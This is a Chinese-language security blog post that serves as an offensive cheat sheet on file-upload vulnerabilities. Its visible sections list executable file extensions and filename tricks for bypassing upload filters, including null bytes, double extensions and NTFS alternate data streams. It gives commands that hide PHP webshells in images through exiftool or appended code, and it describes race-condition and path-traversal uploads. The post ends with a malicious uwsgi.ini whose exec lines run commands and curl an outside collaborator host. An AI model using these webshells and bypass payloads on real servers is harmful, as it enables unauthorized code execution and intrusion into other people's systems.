<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="文件上传漏洞 文件上传通用方法 可能会被解析为代码的文件后缀 绕过文件后缀检查的方法   wget File Upload&#x2F;SSRF Trick 从上传文件到其他漏洞 Zip&#x2F;Tar File Automatically decompressed Upload ImageTragic 文件上传之中间件解析漏洞及配置错误利用 Apahce Nginx IIS   文件上传之 W">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传">
<meta property="og:url" content="http://example.com/2023/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
<meta property="og:site_name" content="sing&#39;s Blog">
<meta property="og:description" content="文件上传漏洞 文件上传通用方法 可能会被解析为代码的文件后缀 绕过文件后缀检查的方法   wget File Upload&#x2F;SSRF Trick 从上传文件到其他漏洞 Zip&#x2F;Tar File Automatically decompressed Upload ImageTragic 文件上传之中间件解析漏洞及配置错误利用 Apahce Nginx IIS   文件上传之 W">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Ff6WSmBPdzXAlmAGTt3b5%2Fimage.png?alt=media&token=f7122f46-a81e-4bc2-b5a8-ed45b28bf102">
<meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/AnHengMingYuWAFUploadBypass.png">
<meta property="article:published_time" content="2023-03-16T11:53:54.000Z">
<meta property="article:modified_time" content="2023-03-16T12:03:41.570Z">
<meta property="article:author" content="sing">
<meta property="article:tag" content="文件上传">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Ff6WSmBPdzXAlmAGTt3b5%2Fimage.png?alt=media&token=f7122f46-a81e-4bc2-b5a8-ed45b28bf102">

<link rel="canonical" href="http://example.com/2023/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>文件上传 | sing's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">sing's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-首页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          文件上传
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-16 19:53:54 / Modified: 20:03:41" itemprop="dateCreated datePublished" datetime="2023-03-16T19:53:54+08:00">2023-03-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <ul>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">文件上传漏洞</a><ul>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95">文件上传通用方法</a><ul>
<li><a href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80">可能会被解析为代码的文件后缀</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5%E7%9A%84%E6%96%B9%E6%B3%95">绕过文件后缀检查的方法</a></li>
</ul>
</li>
<li><a href="#wget-file-uploadssrf-trick">wget File Upload&#x2F;SSRF Trick</a></li>
<li><a href="#%E4%BB%8E%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E">从上传文件到其他漏洞</a></li>
<li><a href="#ziptar-file-automatically-decompressed-upload">Zip&#x2F;Tar File Automatically decompressed Upload</a></li>
<li><a href="#imagetragic">ImageTragic</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%88%A9%E7%94%A8">文件上传之中间件解析漏洞及配置错误利用</a><ul>
<li><a href="#apahce">Apahce</a></li>
<li><a href="#nginx">Nginx</a></li>
<li><a href="#iis">IIS</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B-waf-%E5%AF%B9%E6%8A%97">文件上传之 WAF 对抗</a><ul>
<li><a href="#%E5%BC%95%E5%8F%B7%E5%8F%98%E6%8D%A2"><strong>引号变换</strong></a></li>
<li><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E6%8D%A2"><strong>大小写变换</strong></a></li>
<li><a href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6"><strong>换行符</strong></a></li>
<li><a href="#%E5%A4%9A%E4%B8%AA%E5%88%86%E5%8F%B7"><strong>多个分号</strong></a></li>
<li><a href="#%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7"><strong>多个等号</strong></a></li>
<li><a href="#%E5%8F%98%E6%8D%A2-content-disposition-%E7%9A%84%E5%80%BC"><strong>变换 Content-Disposition 的值</strong></a></li>
<li><a href="#%E7%95%B8%E5%BD%A2%E7%9A%84-boundary-%E5%A4%B4%E9%83%A8"><strong>畸形的 boundary 头部</strong></a></li>
<li><a href="#%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92"><strong>顺序颠倒</strong></a><ul>
<li><a href="#%E4%BA%A4%E6%8D%A2-name-%E5%92%8C-filename-%E7%9A%84%E9%A1%BA%E5%BA%8F"><strong>交换 name 和 filename 的顺序</strong></a></li>
<li><a href="#%E4%BA%A4%E6%8D%A2-content-disposition-%E5%92%8C-content-type-%E7%9A%84%E9%A1%BA%E5%BA%8F"><strong>交换 Content-Disposition 和 Content-Type 的顺序</strong></a></li>
<li><a href="#%E4%BA%A4%E6%8D%A2%E4%B8%8D%E5%90%8C-boundary-%E5%86%85%E5%AE%B9%E7%9A%84%E9%A1%BA%E5%BA%8F"><strong>交换不同 boundary 内容的顺序</strong></a></li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E9%87%8D%E5%A4%8D"><strong>数据重复</strong></a><ul>
<li><a href="#boundary-%E5%86%85%E5%AE%B9%E9%87%8D%E5%A4%8D"><strong>boundary 内容重复</strong></a></li>
<li><a href="#filename-%E9%87%8D%E5%A4%8D"><strong>filename 重复</strong></a></li>
</ul>
</li>
<li><a href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><strong>垃圾数据</strong></a><ul>
<li><a href="#name-%E4%B8%8E-filename-%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><strong>name 与 filename 之间插入垃圾数据</strong></a></li>
<li><a href="#boundary-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><strong>boundary 字符串中加入垃圾数据</strong></a></li>
<li><a href="#boundray-%E6%9C%AB%E5%B0%BE%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><strong>boundray 末尾插入垃圾数据</strong></a></li>
<li><a href="#multipartform-data-%E4%B8%8E-boundary-%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><strong>multipart&#x2F;form-data 与 boundary 之间插入垃圾数据</strong></a></li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD"><strong>数据截断</strong></a><ul>
<li><a href="#%E5%9B%9E%E8%BD%A6%E6%8D%A2%E8%A1%8C%E6%88%AA%E6%96%AD"><strong>回车换行截断</strong></a></li>
<li><a href="#%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD"><strong>分号截断</strong></a></li>
<li><a href="#%E5%BC%95%E5%8F%B7%E6%88%AA%E6%96%AD"><strong>引号截断</strong></a></li>
<li><a href="#00-%E6%88%AA%E6%96%AD"><strong>00 截断</strong></a></li>
</ul>
</li>
<li><a href="#%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B">绕过实例</a></li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
</ul>
</li>
</ul>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="文件上传通用方法"><a href="#文件上传通用方法" class="headerlink" title="文件上传通用方法"></a>文件上传通用方法</h2><h3 id="可能会被解析为代码的文件后缀"><a href="#可能会被解析为代码的文件后缀" class="headerlink" title="可能会被解析为代码的文件后缀"></a>可能会被解析为代码的文件后缀</h3><ul>
<li><strong>PHP</strong>: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module</li>
<li><strong>Working in PHPv8</strong>: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp</li>
<li><strong>ASP</strong>: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</li>
<li><strong>Jsp</strong>: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</li>
<li><strong>Coldfusion</strong>: .cfm, .cfml, .cfc, .dbm</li>
<li><strong>Flash</strong>: .swf</li>
<li><strong>Perl</strong>: .pl, .cgi</li>
<li><strong>Erlang Yaws Web Server</strong>: .yaws</li>
</ul>
<h3 id="绕过文件后缀检查的方法"><a href="#绕过文件后缀检查的方法" class="headerlink" title="绕过文件后缀检查的方法"></a>绕过文件后缀检查的方法</h3><ol>
<li><p>测试上面列出的文件后缀，并且对文件后缀进行大小写修改</p>
</li>
<li><p>在可执行文件后缀之前添加允许的文件后缀：</p>
<ul>
<li>file.png.php</li>
<li>file.png. Php5</li>
</ul>
</li>
<li><p>在文件后缀结尾添加特殊的 <strong>ascii</strong> 字符或者 <strong>Unicode</strong> 字符：</p>
<ul>
<li>file.php%20</li>
<li>file.php%0a</li>
<li>file.php%00</li>
<li>file.php%0d%0a</li>
<li>file.php&#x2F;</li>
<li>file.php.\</li>
<li>file.</li>
<li>file.php….</li>
<li>file.pHp5….</li>
</ul>
</li>
<li><p>使用双后缀或多后缀或在后缀之间或结尾填充垃圾数据</p>
<ul>
<li>file.png.php</li>
<li>file.png.pHp5</li>
<li>file.php%00.png</li>
<li>file.php%00.png%00</li>
<li>file.php\x00.png</li>
<li>file.php\x00.png\x00</li>
<li>file.php%0a.png</li>
<li>file.php%0d%0a.png</li>
<li>flile.phpJunk123png</li>
<li>file.png.jpg.php</li>
<li>file.php%00.png%00.jpg</li>
</ul>
</li>
<li><p>在可执行文件后缀之后添加允许的文件后缀或错误的文件后缀（如：<strong>apache httpd 多后缀解析</strong>，只要文件中含有 <strong>.php</strong> ,但不要求以 <strong>.php</strong> 结尾,该类文件均可被视为 php 文件执行）</p>
<ul>
<li>file.php.png</li>
<li>file.php.sing3r</li>
</ul>
</li>
<li><p>在 Windows 环境下，尝试使用 NTFS 备用数据流（ADS）。对于通过 ADS 生成的 <em><strong>由禁止后缀结尾的空文件</strong></em>，寻找其他功能点或漏洞修改其文件内容后，即可获取 SHELL 。<br> <strong>NTFS ADS特性</strong></p>
<table>
<thead>
<tr>
<th>上传文件名</th>
<th>服务器生成文件名</th>
<th>实际文件内容</th>
</tr>
</thead>
<tbody><tr>
<td>Test.php:a.jpg</td>
<td>Test.php</td>
<td>空</td>
</tr>
<tr>
<td>Test.php::$DATA</td>
<td>test.php</td>
<td>实际内容</td>
</tr>
<tr>
<td>Test.php::$INDEX_ALLOCATION</td>
<td>test.php 文件夹</td>
<td>&#x2F;</td>
</tr>
<tr>
<td>Test.php::$DATA.jpg</td>
<td>0.jpg</td>
<td>实际内容</td>
</tr>
<tr>
<td>Test.php::$DATA\aaa.jpg</td>
<td>aaa.jpg</td>
<td>实际内容</td>
</tr>
</tbody></table>
</li>
<li><p>利用操作系统的限制或者应用程序的错误，触发文件保存中文件名的长度限制，切断允许后缀字符。</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux maximum 255 bytes</span></span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Upload the file and check response how many characters it alllows. Let<span class="string">&#x27;s say 236</span></span></span><br><span class="line">python -c &#x27;print &quot;A&quot; * 232&#x27;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Make the payload</span></span></span><br><span class="line">AAA&lt;--SNIP 232 A--&gt;AAA.php.png</span><br></pre></td></tr></table></figure>

<h3 id="绕过-Content-Type-幻数-文件压缩-amp-文件-size-重置"><a href="#绕过-Content-Type-幻数-文件压缩-amp-文件-size-重置" class="headerlink" title="绕过 Content-Type , 幻数, 文件压缩 &amp; 文件 size 重置"></a>绕过 <code>Content-Type</code> , 幻数, 文件压缩 &amp; 文件 size 重置</h3><ul>
<li><p><strong>Content-Type</strong>：尝试修改 <code>Content-Type</code> 头为 <code>image/png</code> ,  <code>text/plain</code> ,  <code>application/octet-stream</code> 等，以绕过检测。</p>
<ul>
<li>Content-Type 头字典：<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt</a></li>
</ul>
</li>
<li><p><strong>幻数</strong>：Magic Number（幻数）是在计算机科学中常用的一个概念，它通常是一个固定长度的字节序列，用于标识文件格式、数据流或协议等的特定属性。这些字节序列通常出现在文件的开头，被称为文件头，也有可能出现在文件的其他位置。通过在文件开头添加真实图像的字节可绕过幻数检查。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_file_signatures">Magic Number List</a></p>
<ul>
<li>在元数据里面插入代码：<code>exiftool -Comment=&quot;&lt;?php echo &#39;Command:&#39;; if($_POST)&#123;system($_POST[&#39;cmd&#39;]);&#125; __halt_compiler();&quot; img.jpg</code></li>
<li>在图片结尾追加代码：<code>echo &#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39; &gt;&gt; img.png</code></li>
</ul>
</li>
<li><p><strong>文件压缩</strong>：对于文件压缩，如 PHP 中的 PHP-GD 库，可以使用 <a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PLTE 块技术</a> 插入一些经过压缩后仍然存在的文本，从而插入恶意代码。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php">Github with the code</a></li>
</ul>
</li>
<li><p><strong>文件 size 重置</strong>：对于文件大小重置，如 PHP-GD 库的 <code>imagecopyresized</code> 或 <code>imagecopyresampled</code> 函数，可以使用 <a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">IDAT 块技术</a> 插入一些经过压缩后仍然存在的文本，从而插入恶意代码。使用 <code>thumbnailImage</code> 函数则可以 <a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">tEXt 块技术</a>。</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php">IDAT 块技术 Github with the code</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php">tEXt 块技术 Github with the code</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ul>
<li>查找重命名功能模块或其他安全漏洞，重命名已上传文件后缀。</li>
<li>查找本地文件包含漏洞以执行 websehll</li>
<li>触发信息泄露<ul>
<li><p>多次同时上传具有相同名称的同一文件。该方法同时也适用于<strong>“文件上传之条件竞争攻击”</strong>，<strong>条件竞争漏洞（Race condition）</strong>官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。upload-labs 中的 Pass-17 是一个典型的条件竞争上传代码执行逻辑：先移动，后检测，不符合再删除，符合则改名字。因此我们可以让 BurpSuite 一直发包，让 php 程序一直处于移动 php 文件到 upload 目录。这个阶段我们使用多线程并发访问上传的文件，总会有一次在上传文件到删除文件这个时间段访问到上传的 php 文件，一旦我们成功访问到上传的 php 文件，那么它就会向服务器写一个 shell。</p>
</li>
<li><p>上传与已存在得文件或文件夹相同名称的文件</p>
</li>
<li><p>以 <code>.</code> 、<code>..</code> 、<code>...</code> 作文上传文件的文件名。例如，在 Windows 的 Apache 中，如果应用程序将上传的文件保存在 <code>/www/uploads/</code> 目录中，以 <code>.</code> 作为文件名时，应用程序将在 <code>/www/</code> 目录中创建一个名为 “uploads” 的文件。关于 <code>..</code>，我们可以引申出一种关于绕过安全上传目录的方法。有时候上传可执行文件之后，会发现无法执行脚本代码，如果文件以原始文件名保存到服务器中，则可以尝试如 <code>../../../../../shell.jspx</code> 命名方式绕过上传安全目录，从而执行 webshell 。</p>
</li>
<li><p>上传难以删除的文件，例如在 NTFS 中的 <code>...:.jpg</code></p>
</li>
<li><p>上传包含非法字符的文件，例如 windows 的文件名的非法字符 <code>|&lt;&gt;*?”</code></p>
</li>
<li><p>使用保留名称，例如在 Windows 中上传文件： CON、PRN、AUX、NUL、COM1、COM2、COM3、COM4、COM5、COM6、COM7、COM8、COM9、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6 、LPT7、LPT8 和 LPT9。</p>
</li>
</ul>
</li>
<li>上传可执行文件 (.exe) 或 .html（不太可疑），这些文件或者会被好奇之人打开（ <del>想多了</del> ）。</li>
<li>有时候上传接口可能存在控制上传文件后缀的隐藏参数或者控制上传文件保存路径的隐藏参数，可以尝试 FUZZ 参数以上传 WebShell。</li>
</ul>
<h3 id="特别后缀文件技巧"><a href="#特别后缀文件技巧" class="headerlink" title="特别后缀文件技巧"></a>特别后缀文件技巧</h3><ul>
<li>PHP：<ul>
<li>上传 <code>.htaccess</code>，详见相关<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess">技巧</a></li>
<li>上传 <code>.user.ini</code>，详见相关<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/474484548">技巧</a></li>
<li>上传 <code>.phar</code>，通过 PHP 执行，或者包含在 PHP 脚本中</li>
<li>上传 <code>.inc</code>，<code>.inc</code> 文件在 PHP 中通常用来导入 PHP 文件，关于 <code>.inc</code> 文件，可能出现两种利用情况：<ul>
<li>被视为执行文件：<code>.inc</code> 文件有时候会被视为可执行文件，所以可以直接上传该文件并访问。</li>
<li>文件包含：有时候应用程序会包含 <code>.inc</code> 文件,上传同名的 <code>.inc</code> 文件以覆盖原来的 <code>.inc</code> 文件,即可进行 GET SHELL。其次，有时候应用程序会使用 <code>spl_autoload_register()</code> 注册自动加载函数。当不提供任何参数时，PHP 会默认使用 <code>spl_autoload()</code> 函数作为自动加载函数。此时若能否上传一个包含恶意代码的 <code>sing3r.inc</code> 文件到调用 <code>spl_autoload_register()</code> 函数的 PHP 脚本所在目录中，通过反序列化调用 <code>sing3r</code> 函数，即可触发 <code>spl_autoload()</code> 自动包含 <code>sing3r.inc</code>，从而 GET SHELL。关于 <code>spl_autoload_register()</code>的利用详见<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/160343.html">本文</a>。</li>
</ul>
</li>
</ul>
</li>
<li>ASP：上传 <code>.config</code>，详见相关<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-config-files">技巧</a></li>
</ul>
<h2 id="Jetty-RCE"><a href="#Jetty-RCE" class="headerlink" title="Jetty RCE"></a>Jetty RCE</h2><p>由于 Jetty 会自动处理 <code>*.xml</code> 和 <code>*.war</code> ，所以当服务器允许上传一个 <code>*.xml</code> 文件到 <code>$JETTY_BASE/webapps/</code> 时，我们将会获得一个 RCE。</p>
<p><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Ff6WSmBPdzXAlmAGTt3b5%2Fimage.png?alt=media&token=f7122f46-a81e-4bc2-b5a8-ed45b28bf102"></p>
<h2 id="uWSGI-RCE"><a href="#uWSGI-RCE" class="headerlink" title="uWSGI RCE"></a>uWSGI RCE</h2><p>如果可以替换 uWSGI 服务器的 <code>.ini</code> 配置文件，将会获得一个 RCE 。</p>
<p>恶意 <code>uwsgi.ini</code> 示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">; read from a symbol</span><br><span class="line">foo = @(sym://uwsgi_funny_function)</span><br><span class="line">; read from binary appended data</span><br><span class="line">bar = @(data://[REDACTED])</span><br><span class="line">; read from http</span><br><span class="line">test = @(http://[REDACTED])</span><br><span class="line">; read from a file descriptor</span><br><span class="line">content = @(fd://[REDACTED])</span><br><span class="line">; read from a process stdout</span><br><span class="line">body = @(exec://whoami)</span><br><span class="line">; curl to exfil via collaborator</span><br><span class="line">extra = @(exec://curl http://collaborator-unique-host.oastify.com)</span><br><span class="line">; call a function returning a char *</span><br><span class="line">characters = @(call://uwsgi_func)</span><br></pre></td></tr></table></figure>

<p>当配置文件将被解析时，有效负载将被执行。请注意，对于要解析的配置，需要重新启动进程（通过 Crash&#x2F;DoS 使服务重启？）或自动重新加载文件（可能正在使用的选项指示：“如果发现更改，重新加载文件”）。 </p>
<p>重要说明：配置文件的 uWSGI 解析是松散的。先前的有效负载可以嵌入到二进制文件中（例如图像、pdf、…）。</p>
